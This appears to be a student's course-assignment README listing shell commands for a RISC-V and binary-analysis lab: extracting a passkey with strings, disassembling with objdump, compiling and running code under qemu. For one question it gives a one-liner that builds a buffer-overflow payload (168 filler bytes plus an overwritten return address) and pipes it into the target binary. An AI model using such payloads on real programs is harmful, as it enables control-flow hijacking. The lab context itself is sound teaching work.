[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/d5nOy1eX)


strings target_harshitshah270307-hub > abc.txt   (command to find the passkey with the strings)


riscv64-linux-gnu-objdump -d target_harshitshah270307-hub | grep -A 50 "<main>"   (command to open the file in RISC-V assembly code)


gcc -shared -fPIC add.c -o libadd.so (command to compile librarites for q4)


riscv64-linux-gnu-gcc -static -g -o bst main.c q1.s(compile code for q1)


qemu-riscv64 ./bst(run code for q1)


python3 -c 'open("payload","wb").write(b"A"*168 + (0x104e8).to_bytes(8,"little"))'  (command for q3 b part)


./target_harshitshah270307-hub\(b\) < payload (run command for q3)



